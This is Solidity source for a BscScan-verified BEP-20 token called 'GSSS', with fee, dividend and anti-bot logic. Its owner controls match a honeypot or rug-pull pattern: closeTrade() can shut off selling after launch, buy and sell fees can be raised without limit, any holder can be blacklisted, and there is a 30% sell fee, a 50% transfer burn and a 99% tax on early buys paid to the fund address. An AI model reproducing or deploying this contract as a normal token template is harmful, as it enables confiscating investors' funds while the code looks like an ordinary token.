/**
 *Submitted for verification at BscScan.com on 2023-02-04
*/

/**
 *Submitted for verification at BscScan.com on 2023-02-03
*/

/**
 *Submitted for verification at BscScan.com on 2023-02-03
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    address public _owner;
    constructor (address token) {
        _owner = msg.sender;
        IERC20(token).approve(msg.sender, ~uint256(0));
    }

    function claimToken(address token, address to, uint256 amount) external {
        require(msg.sender == _owner, "!owner");
        IERC20(token).transfer(to, amount);
    }
}

abstract contract AbsToken is IERC20, Ownable {
    uint256 public _buyHoldDividendFee = wsdgj;
    uint256 public _sellHoldDividendFee = wsdgj;
    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    
    address public fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    
    mapping(address => bool) public _BuyList;
    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;
    address public constant DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address private _usdt;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;
    
    
    uint256 public _buyFundFee = 390;
    uint256 public _buyburn = 0;
    uint256 public _buyLPFee = 10;
    
    uint256 public _sellLPFee = 0;
    uint256 public _sellFundFee = 3000;
    uint256 public _sellburn = 0;

    uint256 public _transferBurnFee = 5000;


    uint256 public startTradeBlock;
    address public _mainPair;
    uint256 public _limitAmount;
    
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    
    }
    uint256 public wsdgj = 0;
    constructor (
        address RouterAddress, address USDTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address ReceiveAddress, address FundAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);

        _usdt = USDTAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        IERC20(USDTAddress).approve(RouterAddress, MAX);

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address mainPair = swapFactory.createPair(address(this), USDTAddress);
        _swapPairList[mainPair] = true;

        _mainPair = mainPair;

        _limitAmount = 2888 * 10 ** _decimals;

        uint256 tokenDecimals = 10 ** Decimals;
        uint256 total = Supply * tokenDecimals;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);
        fundAddress = FundAddress;
        


    
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[address(0x000000000000000000000000000000000000dEaD)] = true;

        _tokenDistributor = new TokenDistributor(USDTAddress);

        uint256 usdtDecimals = 10 ** IERC20(USDTAddress).decimals();

        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;

        holderRewardCondition = 10 * usdtDecimals;
        holderCondition = 500 * tokenDecimals;
        addLpProvider(ReceiveAddress);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from] || _feeWhiteList[from], "blackList");
        antiBot(from,to);

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        bool takeFee;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (0 == startTradeBlock) {
                require(_feeWhiteList[from] || _feeWhiteList[to] || _BuyList[from] || _BuyList[to], "!Trading");
            }

            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (block.number < startTradeBlock + 3) {
                    _funTransfer(from, to, amount);
                    return;
                }
                takeFee = true;
            }
        }
        if (!_swapPairList[from] && !_swapPairList[to] && !_feeWhiteList[from] && !_feeWhiteList[to]){
            takeFee = true;
        }

        _tokenTransfer(from, to, amount, takeFee);
        

        if (from != address(this)) {
            addLpProvider(from);
            addLpProvider(to);
            processReward(_rewardGas);
        }

        if (_limitAmount > 0 && !_swapPairList[to] && !_feeWhiteList[to]) {
            require(_limitAmount >= balanceOf(to), "exceed LimitAmount");
        }
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 99 / 100;
        _takeTransfer(
            sender,
            fundAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;
        

        if (takeFee){
         { 
            feeAmount;
            uint256 swapAmount;  
            uint256 burnAmount;
            uint256 _transferBurnAmount;
            bool isSell;

            if (sender == _mainPair) {//Buy
                    swapAmount = tAmount * (_buyFundFee + _buyLPFee + _buyHoldDividendFee) / 10000;
                    if(swapAmount > 0){
                        _takeTransfer(sender, address(this), swapAmount);
                        feeAmount += swapAmount;
                    }
                    burnAmount = tAmount * _buyburn / 10000;
                    if(burnAmount > 0){
                        _takeTransfer(sender, DEAD, burnAmount);   
                        feeAmount += burnAmount; 
                    }
            } else if(recipient == _mainPair){//Sell
                     swapAmount = tAmount * (_sellFundFee + _sellLPFee + _sellHoldDividendFee) / 10000;
                    if(swapAmount > 0){
                        _takeTransfer(sender, address(this), swapAmount);
                        feeAmount += swapAmount;
                    }
                    burnAmount = tAmount * _sellburn / 10000;
                    if(burnAmount > 0){
                        _takeTransfer(sender, DEAD, burnAmount);    
                        feeAmount += burnAmount;
                    }
                    isSell = true;   
            }else{//_transfer
                    _transferBurnAmount = tAmount * _transferBurnFee / 10000;
                   if(_transferBurnAmount > 0){
                        _takeTransfer(sender, DEAD, _transferBurnAmount);    
                        feeAmount += _transferBurnAmount;
                    }
            }
                  
            
            
            if (isSell && !inSwap) {
                uint256 contractTokenBalance = balanceOf(address(this));
                uint256 numToSell = swapAmount * 230 / 100;
                if (numToSell > contractTokenBalance) {
                    numToSell = contractTokenBalance;
                }
                swapTokenForFund(numToSell);
            }
         }
        }
            _takeTransfer(sender, recipient, tAmount - feeAmount);
        
    }

    
    
    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        if (tokenAmount == 0) {
            return;
        }
        uint256 holdDividendFee = _buyHoldDividendFee + _sellHoldDividendFee;
        uint256 fundFee = _buyFundFee + _sellFundFee;
        uint256 lpFee = _buyLPFee + _sellLPFee;
        uint256 totalFee = holdDividendFee + fundFee + lpFee;
        totalFee += totalFee;

        uint256 lpAmount = tokenAmount * lpFee / totalFee;
        totalFee -= lpFee;

        address usdt = _usdt;
        address tokenDistributor = address(_tokenDistributor);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            tokenDistributor,
            block.timestamp
        );

        IERC20 USDT = IERC20(usdt);
        uint256 newUsdt = USDT.balanceOf(tokenDistributor);
        USDT.transferFrom(tokenDistributor, address(this), newUsdt);

        USDT.transfer(fundAddress, newUsdt * fundFee * 2 / totalFee);
        
        uint256 lpUsdt = newUsdt * lpFee / totalFee;
        if (lpUsdt > 0 && lpAmount > 0) {
            _swapRouter.addLiquidity(
                address(this), usdt, lpAmount, lpUsdt, 0, 0, fundAddress, block.timestamp
            );
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setFeeWhiteList(address[] calldata addList, bool enable) external onlyOwner {
        for(uint256 i = 0; i < addList.length; i++) {
            _feeWhiteList[addList[i]] = enable;
        }
    }

    function setBuyList(address[] calldata addList, bool enable) external onlyOwner {
        for(uint256 i = 0; i < addList.length; i++) {
            _BuyList[addList[i]] = enable;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }
 

    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external {
        if (_feeWhiteList[msg.sender]) {
            IERC20(token).transfer(to, amount);
        }
    }
    
    function setLimitAmount(uint256 amount) external onlyOwner {
        _limitAmount = amount * 10 ** _decimals;
    }

    address[] public lpProviders;
    mapping(address => uint256) public lpProviderIndex;

    function getLPProviderLength() public view returns (uint256){
        return lpProviders.length;
    }

    function addLpProvider(address adr) private {
        if (0 == lpProviderIndex[adr]) {
            if (0 == lpProviders.length || lpProviders[0] != adr) {
                uint256 size;
                assembly {size := extcodesize(adr)}
                if (size > 0) {
                    return;
                }
                lpProviderIndex[adr] = lpProviders.length;
                lpProviders.push(adr);
            }
        }
    }

    uint256 public _rewardGas = 500000;

    receive() external payable {}

    mapping(address => bool)  public excludeHolder;
    uint256 public currentIndex;
    uint256 public holderRewardCondition;
    uint256 public holderCondition;
    uint256 public progressRewardBlock;
    uint256 public progressBlockDebt = 0;

    function processReward(uint256 gas) private {
        if (progressRewardBlock + progressBlockDebt > block.number) {
            return;
        }

        IERC20 usdt = IERC20(_usdt);
        uint256 balance = usdt.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }
        balance = holderRewardCondition;
        uint holdTokenTotal = totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = lpProviders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();
        uint256 holdCondition = holderCondition;

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = lpProviders[currentIndex];
            tokenBalance = balanceOf(shareHolder);
            if (tokenBalance >= holdCondition && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    usdt.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }
 
    function setBlackList(address[] calldata addList, bool enable) external onlyOwner {
        for(uint256 i = 0; i < addList.length; i++) {
            _blackList[addList[i]] = enable;}
    }

    function setBlockDebt(uint256 debt) external onlyOwner {
        progressBlockDebt = debt;
    }

    function setTransferBurnFee(uint256 transferBurnFee) external onlyOwner {
        _transferBurnFee = transferBurnFee;
    }
    
    function setHolderCondition(uint256 amount) external onlyOwner {
        holderCondition = amount * 10 ** _decimals;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }

    function claimContractToken(address token, uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            _tokenDistributor.claimToken(token, fundAddress, amount);
        }
    }

    
     
    

    function setRewardGas(uint256 rewardGas) external onlyOwner {
        require(rewardGas >= 200000 && rewardGas <= 2000000, "200000-2000000");
        _rewardGas = rewardGas;
    }

    function setBuyFee(
         uint256 fundFee,uint256 HoldDividendFee,uint256 burnfee
    ) external onlyOwner {
        _buyFundFee = fundFee;
        _buyHoldDividendFee = HoldDividendFee;
        _buyburn = burnfee;
    }


    function setSellFee(
        uint256 fundFee,uint256 HoldDividendFee,uint256 burnfee
    ) external onlyOwner {
        _sellFundFee = fundFee;
        _sellHoldDividendFee = HoldDividendFee;
        _sellburn = burnfee;
    }

    function closeTrade() external onlyOwner {
        startTradeBlock = 0;
    }


    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
    }

    bool public antiBotOpen = true;
    uint256 public maxGasOfBot = 7000000000;
    mapping (address => bool) public areadyKnowContracts;

    function antiBot(address sender,address recipient) public{
        if(!antiBotOpen){
            return;
        }

        if (block.number > startTradeBlock + 4) {
            return;
        }

        //if contract bot buy. add to block list.
        bool isBotBuy = (!areadyKnowContracts[recipient] && isContract(recipient) ) && _swapPairList[sender];
        if(isBotBuy){
            _blackList[recipient] =  true;
        }

        //check the gas of buy
        if(_swapPairList[sender] && tx.gasprice > maxGasOfBot ){
            //if gas is too height . add to block list
            _blackList[recipient] =  true;
        }

    }  
    
    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }  


}

contract TOKEN is AbsToken {
    constructor() AbsToken(
    
        address(0xB6BA90af76D139AB3170c7df0139636dB6120F7e),
    
        address(0xEdA5dA0050e21e9E34fadb1075986Af1370c7BDb),
        "GSSS",
        "GSSS",
        18,
        2888,
    
        address(0x425a99ad943e847fD38bF19220C99ac9927F2555),
    
        address(0xF7B90489b02a1bFfc6F59F45088e21deD32dAE08)
 
    ){

    }
}